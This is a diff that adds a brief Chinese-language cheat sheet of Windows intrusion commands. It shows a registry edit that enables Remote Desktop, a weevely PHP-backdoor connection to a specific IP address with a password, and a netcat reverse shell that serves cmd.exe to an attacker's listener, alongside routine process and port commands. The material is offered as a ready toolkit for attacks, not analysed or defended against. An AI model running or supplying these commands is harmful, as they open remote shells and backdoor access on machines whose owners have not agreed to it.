@@ -1,0 +1,19 @@
+CMD开远程
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+获取进程路径
+    wmic process get name,handle,executablepath
+
+php后门
+    weevely http://211.100.28.181/login.php 123
+
+查看监听端口
+    netstat -a -o -n |findstr 0.0:2011
+
+杀死进程
+    taskkill /f /im notepad.exe
+    taskill /pid 9764
+
+nc反弹shell
+    nc -vv -l -p 8080     //服务器
+    nc -vv 步骤1监听的地址 8080 -e 上传的cmd.exe    //主机
